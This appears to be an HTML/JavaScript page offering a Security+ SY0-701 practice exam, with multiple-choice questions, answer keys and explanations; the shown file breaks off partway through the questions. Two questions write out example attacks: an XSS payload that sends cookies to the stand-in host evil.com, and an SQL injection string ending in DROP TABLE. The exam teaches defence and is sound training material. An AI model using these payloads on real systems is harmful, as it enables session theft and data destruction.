@@ -1,0 +1,1262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CompTIA Security+ SY0-701 — 90 Question Practice Exam</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e1a;
+    --surface: #111827;
+    --surface2: #1a2235;
+    --border: #1e2d45;
+    --accent: #00d4ff;
+    --accent2: #ff6b35;
+    --success: #00e676;
+    --danger: #ff4444;
+    --text: #e2e8f0;
+    --muted: #64748b;
+    --mono: 'IBM Plex Mono', monospace;
+    --sans: 'IBM Plex Sans', sans-serif;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; overflow-x: hidden; }
+  .grid-bg { position: fixed; inset: 0; background-image: linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; z-index: 0; }
+  .scanline { position: fixed; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px); pointer-events: none; z-index: 0; }
+  .container { max-width: 860px; margin: 0 auto; padding: 2rem 1.5rem 4rem; position: relative; z-index: 1; }
+  header { display: flex; align-items: center; justify-content: space-between; padding: 1.5rem 0 2.5rem; border-bottom: 1px solid var(--border); margin-bottom: 2.5rem; flex-wrap: wrap; gap: 1rem; }
+  .logo-label { font-family: var(--mono); font-size: 0.65rem; letter-spacing: 0.2em; color: var(--accent); text-transform: uppercase; display: block; }
+  .logo-title { font-size: 1.4rem; font-weight: 600; letter-spacing: -0.02em; }
+  .logo-title span { color: var(--accent); }
+  .header-stats { display: none; gap: 2rem; }
+  .stat { display: flex; flex-direction: column; align-items: flex-end; }
+  .stat-value { font-family: var(--mono); font-size: 1.4rem; font-weight: 600; color: var(--accent); line-height: 1; }
+  .stat-label { font-size: 0.7rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.1em; margin-top: 2px; }
+  .progress-bar-wrap { height: 3px; background: var(--border); border-radius: 2px; margin-bottom: 2rem; overflow: hidden; }
+  .progress-bar-fill { height: 100%; background: linear-gradient(90deg, var(--accent), #7c3aed); border-radius: 2px; transition: width 0.4s ease; }
+  .domain-badge { display: inline-flex; align-items: center; gap: 0.5rem; background: rgba(0,212,255,0.08); border: 1px solid rgba(0,212,255,0.2); border-radius: 4px; padding: 0.3rem 0.75rem; font-family: var(--mono); font-size: 0.7rem; color: var(--accent); letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 1.2rem; }
+  .domain-dot { width: 6px; height: 6px; background: var(--accent); border-radius: 50%; animation: pulse 2s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.4;transform:scale(.7)} }
+  .question-card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 2rem; margin-bottom: 1.5rem; position: relative; overflow: hidden; }
+  .question-card::before { content:''; position:absolute; top:0; left:0; right:0; height:2px; background:linear-gradient(90deg, var(--accent), transparent); }
+  .q-number { font-family: var(--mono); font-size: 0.7rem; color: var(--muted); letter-spacing: 0.15em; margin-bottom: 1rem; text-transform: uppercase; }
+  .q-text { font-size: 1.05rem; line-height: 1.7; font-weight: 400; color: var(--text); margin-bottom: 0.5rem; }
+  .q-scenario { background: var(--surface2); border-left: 3px solid var(--accent2); border-radius: 0 6px 6px 0; padding: 1rem 1.2rem; font-size: 0.88rem; line-height: 1.6; color: #94a3b8; margin: 1rem 0 1.5rem; font-family: var(--mono); white-space: pre-wrap; }
+  .options { display: flex; flex-direction: column; gap: 0.75rem; margin-top: 1.5rem; }
+  .option { display: flex; align-items: flex-start; gap: 1rem; padding: 1rem 1.2rem; border: 1px solid var(--border); border-radius: 8px; cursor: pointer; transition: all 0.18s ease; background: var(--surface2); }
+  .option:hover:not(.disabled) { border-color: var(--accent); background: rgba(0,212,255,0.05); transform: translateX(4px); }
+  .option.selected { border-color: var(--accent); background: rgba(0,212,255,0.08); }
+  .option.correct { border-color: var(--success); background: rgba(0,230,118,0.08); animation: correctPop 0.4s ease; }
+  .option.wrong { border-color: var(--danger); background: rgba(255,68,68,0.08); animation: wrongShake 0.35s ease; }
+  .option.reveal-correct { border-color: var(--success); background: rgba(0,230,118,0.05); }
+  @keyframes correctPop { 0%{transform:scale(1)} 40%{transform:scale(1.01)} 100%{transform:scale(1)} }
+  @keyframes wrongShake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-6px)} 75%{transform:translateX(6px)} }
+  .option-letter { width:28px; height:28px; min-width:28px; border:1px solid var(--border); border-radius:5px; display:flex; align-items:center; justify-content:center; font-family:var(--mono); font-size:.75rem; font-weight:600; color:var(--muted); transition:all .18s; }
+  .option.selected .option-letter,.option.correct .option-letter { background:var(--accent); border-color:var(--accent); color:var(--bg); }
+  .option.wrong .option-letter { background:var(--danger); border-color:var(--danger); color:#fff; }
+  .option.reveal-correct .option-letter { background:var(--success); border-color:var(--success); color:var(--bg); }
+  .option-text { font-size:.92rem; line-height:1.6; color:#cbd5e1; padding-top:3px; }
+  .option.disabled { cursor:default; }
+  .explanation { display:none; margin-top:1.2rem; padding:1.2rem; background:var(--surface2); border:1px solid rgba(0,230,118,0.2); border-radius:8px; }
+  .explanation.show { display:block; animation:fadeIn .3s ease; }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:translateY(0)} }
+  .explanation-title { font-family:var(--mono); font-size:.7rem; text-transform:uppercase; letter-spacing:.15em; color:var(--success); margin-bottom:.6rem; }
+  .explanation-text { font-size:.88rem; line-height:1.7; color:#94a3b8; }
+  .explanation-text strong { color:var(--accent); }
+  .explanation-text code { background:rgba(0,212,255,0.1); padding:1px 5px; border-radius:3px; font-family:var(--mono); font-size:.82rem; }
+  .actions { display:flex; gap:1rem; margin-top:1.5rem; flex-wrap:wrap; align-items:center; }
+  .btn { padding:.75rem 1.75rem; border-radius:7px; font-family:var(--mono); font-size:.8rem; font-weight:600; letter-spacing:.08em; text-transform:uppercase; cursor:pointer; border:none; transition:all .18s; }
+  .btn-primary { background:var(--accent); color:var(--bg); }
+  .btn-primary:hover { background:#33ddff; transform:translateY(-1px); }
+  .btn-primary:disabled { opacity:.35; cursor:not-allowed; transform:none; }
+  .btn-secondary { background:transparent; color:var(--muted); border:1px solid var(--border); }
+  .btn-secondary:hover { border-color:var(--muted); color:var(--text); }
+  .btn-flag { background:transparent; color:var(--accent2); border:1px solid rgba(255,107,53,0.3); }
+  .btn-flag.flagged { background:rgba(255,107,53,0.1); border-color:var(--accent2); }
+  .btn-flag:hover { border-color:var(--accent2); background:rgba(255,107,53,0.1); }
+  #results-screen { display:none; text-align:center; padding:3rem 0; }
+  #results-screen.show { display:block; animation:fadeIn .5s ease; }
+  .result-ring { width:160px; height:160px; border-radius:50%; margin:0 auto 2rem; display:flex; flex-direction:column; align-items:center; justify-content:center; position:relative; }
+  .result-ring::before { content:''; position:absolute; inset:0; border-radius:50%; border:6px solid var(--border); }
+  .result-ring::after { content:''; position:absolute; inset:0; border-radius:50%; border:6px solid transparent; border-top-color:var(--accent); animation:spinOnce 1s ease-out forwards; }
+  @keyframes spinOnce { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
+  .result-score { font-family:var(--mono); font-size:2.8rem; font-weight:600; color:var(--accent); line-height:1; }
+  .result-total { font-size:.8rem; color:var(--muted); margin-top:4px; }
+  .result-verdict { font-size:1.5rem; font-weight:600; margin-bottom:.5rem; }
+  .result-sub { color:var(--muted); font-size:.9rem; margin-bottom:2.5rem; }
+  .result-breakdown { display:flex; gap:1.5rem; justify-content:center; margin-bottom:2.5rem; flex-wrap:wrap; }
+  .breakdown-item { background:var(--surface); border:1px solid var(--border); border-radius:10px; padding:1rem 1.5rem; min-width:120px; }
+  .breakdown-num { font-family:var(--mono); font-size:1.8rem; font-weight:600; }
+  .breakdown-label { font-size:.75rem; color:var(--muted); margin-top:2px; }
+  .domain-results { text-align:left; max-width:600px; margin:0 auto 2.5rem; }
+  .domain-results h3 { font-family:var(--mono); font-size:.75rem; text-transform:uppercase; letter-spacing:.15em; color:var(--muted); margin-bottom:1rem; }
+  .domain-row { display:flex; align-items:center; gap:1rem; margin-bottom:.75rem; }
+  .domain-name { font-size:.82rem; color:var(--text); flex:1; min-width:0; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+  .domain-bar-wrap { width:120px; height:6px; background:var(--border); border-radius:3px; overflow:hidden; }
+  .domain-bar-fill { height:100%; border-radius:3px; background:var(--accent); }
+  .domain-score { font-family:var(--mono); font-size:.75rem; color:var(--muted); width:40px; text-align:right; }
+  #intro-screen { text-align:center; padding:3rem 0; }
+  #intro-screen.hidden { display:none; }
+  .intro-icon { font-size:3.5rem; margin-bottom:1.5rem; filter:drop-shadow(0 0 20px rgba(0,212,255,0.4)); }
+  .intro-title { font-size:2rem; font-weight:600; letter-spacing:-.03em; margin-bottom:.75rem; }
+  .intro-sub { color:var(--muted); font-size:.95rem; line-height:1.7; max-width:520px; margin:0 auto 2rem; }
+  .intro-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:.75rem; max-width:640px; margin:0 auto 2.5rem; text-align:left; }
+  .intro-card { background:var(--surface); border:1px solid var(--border); border-radius:8px; padding:1rem; }
+  .intro-card-title { font-family:var(--mono); font-size:.7rem; text-transform:uppercase; letter-spacing:.1em; color:var(--accent); margin-bottom:.3rem; }
+  .intro-card-val { font-size:1.1rem; font-weight:600; }
+  .intro-card-sub { font-size:.78rem; color:var(--muted); margin-top:2px; }
+  #exam-screen { display:none; }
+  #exam-screen.show { display:block; }
+  .nav-row { display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:1rem; margin-bottom:1rem; }
+  .q-counter { font-family:var(--mono); font-size:.8rem; color:var(--muted); }
+  .q-counter span { color:var(--text); }
+  .timer { font-family:var(--mono); font-size:.85rem; color:var(--accent); background:rgba(0,212,255,0.08); border:1px solid rgba(0,212,255,0.2); padding:.3rem .8rem; border-radius:5px; }
+  .timer.warn { color:var(--accent2); border-color:rgba(255,107,53,0.3); background:rgba(255,107,53,0.08); }
+  .answered-map { display:flex; flex-wrap:wrap; gap:4px; margin-bottom:1.5rem; }
+  .am-dot { width:14px; height:14px; border-radius:3px; background:var(--border); cursor:pointer; transition:background .15s; font-size:0; }
+  .am-dot.answered-c { background:var(--success); }
+  .am-dot.answered-w { background:var(--danger); }
+  .am-dot.skipped { background:var(--muted); }
+  .am-dot.current { outline:2px solid var(--accent); outline-offset:1px; }
+  .am-dot.flagged-dot { outline:2px solid var(--accent2); outline-offset:1px; }
+</style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="scanline"></div>
+<div class="container">
+  <header>
+    <div class="logo">
+      <span class="logo-label">Practice Exam · SY0-701</span>
+      <span class="logo-title">CompTIA <span>Security+</span></span>
+    </div>
+    <div class="header-stats" id="header-stats">
+      <div class="stat"><span class="stat-value" id="stat-correct">0</span><span class="stat-label">Correct</span></div>
+      <div class="stat"><span class="stat-value" style="color:var(--muted)" id="stat-remaining">90</span><span class="stat-label">Remaining</span></div>
+    </div>
+  </header>
+
+  <!-- INTRO -->
+  <div id="intro-screen">
+    <div class="intro-icon">🔐</div>
+    <div class="intro-title">Full Practice Exam</div>
+    <div class="intro-sub">90 realistic SY0-701 style questions covering all five exam domains. Get instant feedback and detailed explanations after every answer.</div>
+    <div class="intro-grid">
+      <div class="intro-card"><div class="intro-card-title">Questions</div><div class="intro-card-val" id="intro-q-count">90</div><div class="intro-card-sub">Multiple choice</div></div>
+      <div class="intro-card"><div class="intro-card-title">Time Limit</div><div class="intro-card-val">90 min</div><div class="intro-card-sub">1 min per question</div></div>
+      <div class="intro-card"><div class="intro-card-title">Passing Score</div><div class="intro-card-val">750 / 900</div><div class="intro-card-sub">≈ 83%</div></div>
+      <div class="intro-card"><div class="intro-card-title">Domains</div><div class="intro-card-val">5</div><div class="intro-card-sub">All SY0-701 domains</div></div>
+    </div>
+    <button class="btn btn-primary" onclick="startExam()">Begin Exam →</button>
+  </div>
+
+  <!-- EXAM -->
+  <div id="exam-screen">
+    <div class="nav-row">
+      <span class="q-counter">Question <span id="q-num">1</span> of <span id="q-total">90</span></span>
+      <span class="timer" id="timer">90:00</span>
+    </div>
+    <div class="progress-bar-wrap"><div class="progress-bar-fill" id="progress-fill" style="width:1.1%"></div></div>
+    <div class="answered-map" id="answered-map"></div>
+    <div id="question-container"></div>
+    <div class="actions">
+      <button class="btn btn-primary" id="btn-next" onclick="nextQuestion()" disabled>Next →</button>
+      <button class="btn btn-secondary" onclick="skipQuestion()">Skip</button>
+      <button class="btn btn-flag" id="btn-flag" onclick="toggleFlag()">⚑ Flag</button>
+    </div>
+  </div>
+
+  <!-- RESULTS -->
+  <div id="results-screen">
+    <div class="result-ring">
+      <div class="result-score" id="final-score">0</div>
+      <div class="result-total" id="result-total">/ 90</div>
+    </div>
+    <div class="result-verdict" id="result-verdict"></div>
+    <div class="result-sub" id="result-sub"></div>
+    <div class="result-breakdown">
+      <div class="breakdown-item"><div class="breakdown-num" style="color:var(--success)" id="br-correct">0</div><div class="breakdown-label">Correct</div></div>
+      <div class="breakdown-item"><div class="breakdown-num" style="color:var(--danger)" id="br-wrong">0</div><div class="breakdown-label">Incorrect</div></div>
+      <div class="breakdown-item"><div class="breakdown-num" style="color:var(--muted)" id="br-skipped">0</div><div class="breakdown-label">Skipped</div></div>
+      <div class="breakdown-item"><div class="breakdown-num" style="color:var(--accent)" id="br-pct">0%</div><div class="breakdown-label">Score</div></div>
+    </div>
+    <div class="domain-results"><h3>Performance by Domain</h3><div id="domain-breakdown"></div></div>
+    <button class="btn btn-primary" onclick="restartExam()">Retake Exam</button>
+  </div>
+</div>
+
+<script>
+const questions = [
+  // ── DOMAIN 1: THREATS, ATTACKS & VULNERABILITIES ──────────────────────────
+  {
+    domain:"1.1 – Social Engineering",
+    text:"An attacker calls an employee pretending to be from the IT helpdesk and convinces them to reveal their password over the phone. What type of attack is this?",
+    options:["Phishing","Vishing","Smishing","Pretexting"],
+    correct:1,
+    explanation:"<strong>Vishing</strong> (voice phishing) uses telephone calls to trick victims into revealing sensitive information. The caller establishes a false identity — here, impersonating IT support. <em>Phishing</em> uses email, <em>smishing</em> uses SMS, and <em>pretexting</em> is the creation of a fabricated scenario (which may be part of vishing but isn't the specific attack vector here)."
+  },
+  {
+    domain:"1.1 – Social Engineering",
+    text:"An attacker leaves USB drives labeled 'Payroll Q4 2024' in a company parking lot, hoping employees will plug them in. This is BEST described as:",
+    options:["Tailgating","Baiting","Spear Phishing","Pharming"],
+    correct:1,
+    explanation:"<strong>Baiting</strong> exploits human curiosity by leaving infected physical media (USB drives, CDs) in locations where targets will find and use them. It relies on the victim's own actions to execute the attack. Tailgating is physical unauthorized entry, spear phishing is targeted email, and pharming redirects DNS."
+  },
+  {
+    domain:"1.1 – Social Engineering",
+    text:"A threat actor sends a highly customized email to a CFO that references a recent acquisition deal by name and appears to come from the company's law firm. This is BEST classified as:",
+    options:["Whaling","General Phishing","Smishing","Watering Hole"],
+    correct:0,
+    explanation:"<strong>Whaling</strong> is spear phishing that specifically targets high-value individuals (C-suite executives). The attack is tailored with specific business context to increase credibility. General phishing is mass and untargeted. Smishing uses SMS. Watering hole attacks compromise websites frequented by the target."
+  },
+  {
+    domain:"1.2 – Malware",
+    text:"Malware installs itself in the system BIOS/UEFI firmware, persisting even after the hard drive is wiped and the OS reinstalled. This is BEST described as a:",
+    options:["Rootkit","Bootkit","Firmware Implant / Persistent Threat","Logic Bomb"],
+    correct:2,
+    explanation:"A <strong>firmware implant</strong> (also called a persistent threat or firmware rootkit) lives in the UEFI/BIOS flash storage — below the OS level — making it survive OS reinstalls and disk wipes. A standard rootkit hides malware at the OS/kernel level. A bootkit modifies the boot sector/MBR. A logic bomb triggers under specific conditions but doesn't describe persistence at this level."
+  },
+  {
+    domain:"1.2 – Malware",
+    text:"A program appears to be a legitimate media player but secretly opens a reverse shell to an attacker's server. What type of malware is this?",
+    options:["Worm","Trojan","Ransomware","Spyware"],
+    correct:1,
+    explanation:"A <strong>Trojan horse</strong> masquerades as legitimate or benign software while performing malicious activity in the background (here, opening a remote shell). Unlike worms, Trojans do not self-replicate. Unlike ransomware, they don't encrypt files for extortion. Unlike spyware, their primary goal here is remote access, not data collection."
+  },
+  {
+    domain:"1.2 – Malware",
+    text:"A worm propagates through a network, consumes bandwidth, then on a specific date deletes system files. The timed destructive payload is called a:",
+    options:["Remote Access Trojan (RAT)","Logic Bomb","Rootkit","Fileless Malware"],
+    correct:1,
+    explanation:"A <strong>logic bomb</strong> is a malicious code segment that executes when specific conditions are met — most commonly a date/time trigger, but also events like a specific user logging in. It is often embedded inside other malware (like the worm in this question). A RAT provides remote control, a rootkit hides malware, and fileless malware uses memory/scripts without writing to disk."
+  },
+  {
+    domain:"1.3 – Application Attacks",
+    scenario:"A web application uses this query:\nSELECT * FROM users WHERE name='$input'\n\nAn attacker enters: ' OR 1=1; DROP TABLE users; --",
+    text:"Which vulnerability allows this attack, and what is the BEST remediation?",
+    options:["XSS — sanitize HTML output","SQL Injection — use parameterized queries / prepared statements","Buffer Overflow — validate input length","CSRF — implement anti-CSRF tokens"],
+    correct:1,
+    explanation:"<strong>SQL Injection</strong> occurs when user input is concatenated directly into SQL queries. The payload closes the string literal (<code>'</code>), adds a tautology (<code>OR 1=1</code>), then runs a destructive command. The best fix is <strong>parameterized queries (prepared statements)</strong>, which treat input as data — never as executable SQL code. Input validation is supplementary, not sufficient alone."
+  },
+  {
+    domain:"1.3 – Application Attacks",
+    text:"An attacker injects <code>&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;</code> into a comment field on a website. Victims who view the comment have their session cookies stolen. This attack is called:",
+    options:["Stored XSS (Persistent XSS)","Reflected XSS","DOM-based XSS","CSRF"],
+    correct:0,
+    explanation:"<strong>Stored (Persistent) XSS</strong> occurs when malicious script is saved to the server's database and served to all users who view the affected page. Every visitor triggers the payload without any further attacker action. Reflected XSS requires a victim to click a crafted link that reflects the payload in the response. DOM-based XSS manipulates the DOM client-side. CSRF tricks users into making authenticated requests."
+  },
+  {
+    domain:"1.3 – Application Attacks",
+    text:"A user is logged into their online banking site. They visit a malicious website that silently submits a fund transfer request to the bank using the user's active session. This attack is:",
+    options:["Session Hijacking","Cross-Site Request Forgery (CSRF)","Clickjacking","Man-in-the-Browser"],
+    correct:1,
+    explanation:"<strong>CSRF (Cross-Site Request Forgery)</strong> tricks an authenticated user's browser into sending forged requests to a trusted site — exploiting the browser's automatic cookie attachment. The attacker doesn't steal the session; they abuse it. The standard defense is <strong>CSRF tokens</strong> (unique per-request tokens that the attacker can't predict). Session hijacking steals the session ID; clickjacking uses invisible overlays."
+  },
+  {
+    domain:"1.3 – Application Attacks",
+    text:"An API returns detailed error messages including database schema information when invalid input is submitted. This represents which vulnerability?",
+    options:["Insecure Direct Object Reference (IDOR)","Improper Error Handling / Information Disclosure","Security Misconfiguration","Broken Function Level Authorization"],
+    correct:1,
+    explanation:"<strong>Improper Error Handling / Information Disclosure</strong> exposes internal implementation details (stack traces, DB schema, framework versions) through verbose error messages. This provides attackers with reconnaissance data. Errors shown to users should be generic. IDOR exposes object references, security misconfiguration is a broader category, and BFLA involves unauthorized access to API functions."
+  },
+  {
+    domain:"1.4 – Network Attacks",
+    scenario:"An analyst observes: thousands of SYN packets from a single source to port 443, with no corresponding ACK responses.",
+    text:"What is occurring and what is the INTENDED effect?",
+    options:["UDP Flood — saturate bandwidth","SYN Flood — exhaust TCP connection state table (half-open connections)","Ping Flood — overwhelm ICMP processing","Smurf Attack — amplify traffic via broadcast"],
+    correct:1,
+    explanation:"A <strong>SYN Flood</strong> exploits the TCP 3-way handshake. The attacker sends many SYN packets without completing the handshake (no ACK), causing the server to keep half-open connections in memory until timeout. This exhausts the server's connection state table, causing denial of service. Defenses include SYN cookies, rate limiting, and firewalls that drop incomplete connections."
+  },
+  {
+    domain:"1.4 – Network Attacks",
+    text:"An attacker successfully intercepts HTTPS traffic between a user and their bank by presenting a forged certificate. The attacker is positioned between the browser and server. What type of attack is this?",
+    options:["Replay Attack","On-Path (Man-in-the-Middle) Attack","Eavesdropping","DNS Cache Poisoning"],
+    correct:1,
+    explanation:"An <strong>On-Path (MitM) attack</strong> places the attacker in the communication path to intercept, read, or modify traffic. Intercepting HTTPS requires defeating certificate validation — often done via a rogue CA cert pushed to the victim's trust store (e.g., corporate proxies, malware). Pure eavesdropping is passive; replay reuses captured data; DNS poisoning redirects traffic but the attacker isn't in the path."
+  },
+  {
+    domain:"1.4 – Network Attacks",
+    text:"An attacker sends a crafted DNS response to a resolver, replacing the IP for 'bank.com' with the attacker's server IP. Subsequent users who query that resolver are redirected. This is called:",
+    options:["DNS Spoofing / Cache Poisoning","BGP Hijacking","ARP Poisoning","Typosquatting"],
+    correct:0,
+    explanation:"<strong>DNS Cache Poisoning (DNS Spoofing)</strong> corrupts a DNS resolver's cache with forged records, redirecting users to malicious servers. DNSSEC was designed to prevent this by signing DNS records cryptographically. BGP hijacking corrupts routing at the ISP level, ARP poisoning corrupts Layer 2 address tables, and typosquatting registers similar domain names."
+  },
+  {
+    domain:"1.5 – Threat Intelligence",
+    text:"A security team wants to understand the behavioral patterns, tools, and methodologies used by an APT group — not just their known malware hashes. Which framework is BEST suited for this purpose?",
+    options:["CVE Database","MITRE ATT&CK Framework","CVSS Scoring System","OVAL"],
+    correct:1,
+    explanation:"The <strong>MITRE ATT&CK Framework</strong> documents adversary Tactics, Techniques, and Procedures (TTPs) — the behavioral 'how' of attacks. It is organized by attack lifecycle stages (Initial Access, Execution, Persistence, etc.). CVE tracks specific vulnerabilities, CVSS scores their severity, and OVAL is a language for checking system states. ATT&CK is the standard for threat modeling and purple team exercises."
+  },
+  {
+    domain:"1.5 – Threat Intelligence",
+    text:"Which type of threat intelligence is considered the MOST actionable for immediate defensive use?",
+    options:["Strategic intelligence — geopolitical attacker motivation","Operational intelligence — upcoming campaign specifics","Tactical intelligence — TTPs and attacker behavior","Technical intelligence — IoCs like IPs, hashes, domains"],
+    correct:3,
+    explanation:"<strong>Technical intelligence (IoCs)</strong> — specific IP addresses, file hashes, domains, URLs — can be immediately operationalized in firewalls, SIEM rules, and endpoint tools. However, IoCs have short shelf-life as attackers rotate them. Tactical (TTPs) is more durable but harder to act on immediately. Operational and strategic intel inform planning and policy, not real-time defense."
+  },
+  // ── DOMAIN 2: ARCHITECTURE AND DESIGN ─────────────────────────────────────
+  {
+    domain:"2.1 – Enterprise Architecture",
+    text:"A company segments its network so that the corporate LAN, guest Wi-Fi, and production OT systems are all in separate VLANs with firewall rules between them. This design principle is called:",
+    options:["Defense in Depth","Network Segmentation / Zero Trust","Bastion Host Architecture","Air Gapping"],
+    correct:1,
+    explanation:"<strong>Network Segmentation</strong> divides the network into isolated zones to limit lateral movement. Combined with <strong>Zero Trust</strong> principles ('never trust, always verify'), access between segments requires authentication and authorization. Defense in depth is the broader layered security strategy. Air gapping is physical isolation. A bastion host is a hardened jump server."
+  },
+  {
+    domain:"2.1 – Enterprise Architecture",
+    text:"Which security architecture model operates on the principle that no user or device should be trusted by default — even inside the corporate network — and requires continuous authentication and authorization?",
+    options:["Perimeter-based security","Zero Trust Architecture","Defense in Depth","Security through Obscurity"],
+    correct:1,
+    explanation:"<strong>Zero Trust Architecture (ZTA)</strong> eliminates the implicit trust granted to internal network users. Its core principles: verify explicitly, use least-privilege access, and assume breach. Every access request is authenticated and authorized regardless of network location. This contrasts with perimeter security, which trusts everything inside the firewall. ZTA is enforced through micro-segmentation, MFA, and continuous monitoring."
+  },
+  {
+    domain:"2.2 – Virtualization & Cloud",
+    text:"A company runs multiple virtual machines on a single physical host. The hypervisor itself is compromised, giving an attacker access to all VMs. This threat is called:",
+    options:["VM Escape","Container Breakout","Side-Channel Attack","Hypervisor Exploitation / VM Sprawl"],
+    correct:0,
+    explanation:"<strong>VM Escape</strong> is an attack where malicious code in a VM breaks out of its isolation and gains access to the hypervisor or other VMs — the most severe virtualization attack. Once the hypervisor is compromised, all hosted VMs are at risk. Container breakout is similar but for container environments. Side-channel attacks infer information through indirect means (power consumption, timing)."
+  },
+  {
+    domain:"2.2 – Virtualization & Cloud",
+    text:"In which cloud service model does the provider manage everything EXCEPT the applications and data?",
+    options:["IaaS — Infrastructure as a Service","PaaS — Platform as a Service","SaaS — Software as a Service","FaaS — Function as a Service"],
+    correct:1,
+    explanation:"In <strong>PaaS</strong>, the provider manages the infrastructure, OS, middleware, and runtime. The customer is responsible for their applications and data. In IaaS, customers also manage the OS and up. In SaaS, the provider manages everything including the application. PaaS is typical for development platforms like Azure App Service or Google App Engine."
+  },
+  {
+    domain:"2.3 – Secure Application Development",
+    text:"A developer stores user passwords using MD5 hashing with no additional security measure. Why is this considered insecure?",
+    options:["MD5 produces hashes that are too short to be secure","MD5 is reversible (it is an encryption algorithm, not a hash)","MD5 is fast and vulnerable to rainbow table and brute-force attacks; it lacks salting","MD5 cannot be used for password storage by law"],
+    correct:2,
+    explanation:"MD5 is a cryptographic hash — it is one-directional. However, it is cryptographically broken: it's extremely fast to compute, making brute-force and <strong>rainbow table attacks</strong> trivial. Without a <strong>salt</strong> (unique random value per password), identical passwords produce identical hashes. Best practice is to use adaptive, slow hashing algorithms like <strong>bcrypt, scrypt, or Argon2</strong>, which are designed specifically for password storage."
+  },
+  {
+    domain:"2.3 – Secure Application Development",
+    text:"A security team reviews code before deployment, checking for vulnerabilities like hardcoded credentials and insecure functions. This process is called:",
+    options:["Dynamic Application Security Testing (DAST)","Static Application Security Testing (SAST)","Penetration Testing","Fuzzing"],
+    correct:1,
+    explanation:"<strong>SAST (Static Application Security Testing)</strong> analyzes source code, bytecode, or binaries without executing the application — identifying vulnerabilities at rest. DAST (Dynamic) tests the running application from the outside (black-box). Fuzzing sends random/malformed inputs to find crashes. Penetration testing is a broader assessment. SAST integrates well into CI/CD pipelines for 'shift-left' security."
+  },
+  {
+    domain:"2.3 – Secure Application Development",
+    text:"The practice of integrating security requirements, threat modeling, and code reviews into EVERY phase of the software development lifecycle is called:",
+    options:["Agile Development","DevSecOps / Secure SDLC","Continuous Integration","Regression Testing"],
+    correct:1,
+    explanation:"<strong>DevSecOps</strong> integrates security ('Sec') into the DevOps pipeline, making it a shared responsibility rather than a final gate. A <strong>Secure SDLC</strong> embeds security in requirements gathering, design (threat modeling), development (SAST/peer review), testing (DAST/fuzzing), deployment, and maintenance. This 'shift-left' approach finds vulnerabilities earlier when they are cheaper to fix."
+  },
+  {
+    domain:"2.4 – Cryptography",
+    text:"Which asymmetric key operation is used to ENCRYPT a message so that only the intended recipient can decrypt it?",
+    options:["Encrypt with recipient's private key","Encrypt with sender's private key","Encrypt with recipient's public key","Encrypt with sender's public key"],
+    correct:2,
+    explanation:"In asymmetric cryptography, to send a confidential message: you <strong>encrypt with the recipient's PUBLIC key</strong>. Only the recipient's corresponding private key can decrypt it. To digitally sign (authenticity/non-repudiation), you encrypt the hash with the <em>sender's private key</em>, and anyone can verify using the sender's public key. Mixing these operations is a common exam trap."
+  },
+  {
+    domain:"2.4 – Cryptography",
+    text:"AES-256 is being used in a VPN. Which property of AES makes it suitable for bulk data encryption vs. RSA?",
+    options:["AES uses asymmetric keys so it's more secure","AES is a symmetric cipher — faster for large data volumes","AES uses public keys eliminating key distribution problems","AES is a hash function designed for data integrity"],
+    correct:1,
+    explanation:"<strong>AES (Advanced Encryption Standard)</strong> is a symmetric block cipher — the same key encrypts and decrypts. Symmetric ciphers are dramatically faster than asymmetric (RSA) for bulk data, making AES ideal for VPN traffic encryption. RSA/ECC (asymmetric) are used for <em>key exchange</em> to securely share the AES session key. This hybrid approach combines the security of asymmetric with the speed of symmetric encryption."
+  },
+  {
+    domain:"2.4 – Cryptography",
+    text:"An organization wants to ensure that if their TLS private key is compromised in the future, past recorded sessions cannot be decrypted. Which feature provides this protection?",
+    options:["Certificate Pinning","Perfect Forward Secrecy (PFS)","HSTS","OCSP Stapling"],
+    correct:1,
+    explanation:"<strong>Perfect Forward Secrecy (PFS)</strong> uses ephemeral key exchange (ECDHE or DHE) to generate a unique session key for each TLS session. Even if the server's long-term private key is later compromised, past sessions cannot be decrypted because the session keys were temporary and discarded. PFS is enabled by cipher suites using DHE or ECDHE. Certificate pinning prevents substitution attacks. HSTS enforces HTTPS."
+  },
+  {
+    domain:"2.4 – Cryptography",
+    text:"A file's SHA-256 hash is verified before and after transmission. The hashes match. What security property does this confirm?",
+    options:["Confidentiality — the file was encrypted in transit","Non-repudiation — the sender cannot deny sending the file","Integrity — the file was not altered in transit","Authentication — the file came from a trusted source"],
+    correct:2,
+    explanation:"<strong>Cryptographic hashing</strong> provides <strong>integrity</strong> — verifying that data has not been modified. A matching hash before and after transmission confirms no bits were changed. It does NOT confirm confidentiality (encryption is needed), authentication (digital signatures are needed), or non-repudiation (PKI/digital signatures provide this). Hashing is a one-way function; it cannot be decrypted."
+  },
+  {
+    domain:"2.5 – PKI",
+    text:"A user's digital certificate has been revoked due to key compromise. Which two mechanisms allow relying parties to check if a certificate is still valid?",
+    options:["CRL and OCSP","LDAP and Kerberos","TLS and SSL","X.509 and PEM"],
+    correct:0,
